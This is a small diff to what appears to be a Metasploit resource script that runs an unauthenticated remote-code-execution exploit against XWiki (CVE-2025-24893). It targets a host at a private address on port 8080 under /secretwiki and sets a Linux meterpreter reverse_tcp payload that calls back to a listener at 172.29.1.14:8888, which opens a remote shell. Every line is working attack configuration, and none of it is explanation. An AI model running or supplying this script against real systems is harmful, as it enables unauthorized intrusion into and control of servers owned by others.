@@ -2,8 +2,9 @@ use exploit/multi/http/xwiki_unauth_rce_cve_2025_24893
 set RHOSTS 172.29.3.181
 set RPORT 8080
 set SSL false
+set TARGETURI /secretwiki
+set payload linux/x64/meterpreter/reverse_tcp
 set LHOST 172.29.1.14
 set LPORT 8888
 set TARGET "Unix Command"
-use payload/linux/x64/meterpreter/reverse_tcp
 run
